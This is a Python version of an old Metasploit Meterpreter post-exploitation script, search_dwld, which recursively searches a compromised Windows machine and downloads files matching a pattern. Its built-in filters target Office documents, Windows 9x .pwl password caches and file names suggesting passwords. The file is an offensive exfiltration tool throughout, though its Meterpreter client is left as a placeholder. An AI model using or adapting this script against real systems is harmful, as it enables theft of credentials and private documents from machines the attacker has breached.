#!/usr/bin/env python3
##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##

"""
Meterpreter script that recursively search and download
files matching a given pattern
Provided by Nicob <nicob [at] nicob.net>

                ==   WARNING   ==
As said by mmiller, this kind of script is slow and noisy :
http://www.metasploit.com/archive/framework/msg01670.html
However, it can sometimes save your ass ;-)
                ==   WARNING   ==
"""

import argparse
import os
import re
import sys
import tempfile

# NOTE: This would need actual framework initialization in a real implementation
# Placeholder for Meterpreter client
client = None

# Filters
filters = {
    'office': r'\.(doc|docx|ppt|pptx|pps|xls|xlsx|mdb|od.)$',
    'win9x':  r'\.pwl$',
    'passwd': r'(pass|pwd)',
}

motif = None


def usage():
    """Display usage information"""
    print("search_dwld -- recursively search for and download files matching a given pattern")
    print("USAGE: run search_dwld [base directory] [filter] [pattern]")
    print()
    print("filter can be a defined pattern or 'free', in which case pattern must be given")
    print("Defined patterns:")
    for k in sorted(filters.keys()):
        print(f"\t{k}")
    print()
    print("Examples:")
    print(" run search_dwld")
    print("\t=> recursively look for (MS|Open)Office in C:\\")
    print(" run search_dwld %USERPROFILE% win9x")
    print("\t=> recursively look for *.PWL files in the user home directory")
    print(" run search_dwld E:\\\\ free '\\.(jpg|png|gif)$'")
    print("\t=> recursively look for pictures in the E: drive")


def scan(path):
    """Recursively scan directory for files matching pattern"""
    try:
        dirs = client.fs.dir.foreach(path)
    except Exception as e:
        print(f"[-] Error scanning {path}: {e}")
        return
    
    for x in dirs:
        if re.match(r'^(\.|\.\.)$', x):
            continue
        fullpath = path + '\\' + x
        
        try:
            if client.fs.file.stat(fullpath).directory():
                scan(fullpath)
            elif re.search(motif, fullpath, re.IGNORECASE):
                # Replace ':' or '%' or '\' by '_'
                dst = fullpath.replace(':', '_').replace('%', '_').replace('\\', '_')
                dst = os.path.join(tempfile.gettempdir(), dst)
                dst = os.path.normpath(dst)
                print(f"Downloading '{fullpath}' to '{dst}'")
                client.fs.file.download_file(dst, fullpath)
        except Exception as e:
            print(f"[-] Error processing {fullpath}: {e}")


def unsupported():
    """Check for proper Meterpreter Platform"""
    print("[-] This version of Meterpreter is not supported with this Script!")
    sys.exit(1)


def main():
    global motif
    
    parser = argparse.ArgumentParser(
        description="search_dwld -- recursively search for and download files matching a given pattern",
        add_help=False
    )
    parser.add_argument(
        "basedir", nargs='?', default="C:\\",
        help="Base directory to search (default: C:\\)"
    )
    parser.add_argument(
        "filter", nargs='?', default="office",
        help="Filter to use (default: office)"
    )
    parser.add_argument(
        "pattern", nargs='?',
        help="Pattern when using 'free' filter"
    )
    parser.add_argument(
        "-h", "--help", action="store_true",
        help="Help menu."
    )
    
    args = parser.parse_args()
    
    if args.help:
        usage()
        sys.exit(0)
    
    # Check for proper Meterpreter Platform
    if client is None or client.platform != 'windows':
        unsupported()
    
    # Get arguments
    basedir = args.basedir
    filter_name = args.filter
    
    # Set the regexp
    if filter_name == 'free':
        if args.pattern is None:
            print("[-] free filter requires pattern argument")
            sys.exit(1)
        motif = args.pattern
    else:
        motif = filters.get(filter_name)
    
    if motif is None:
        print("[-] Unrecognized filter")
        sys.exit(1)
    
    # Search and download
    scan(basedir)


if __name__ == "__main__":
    main()
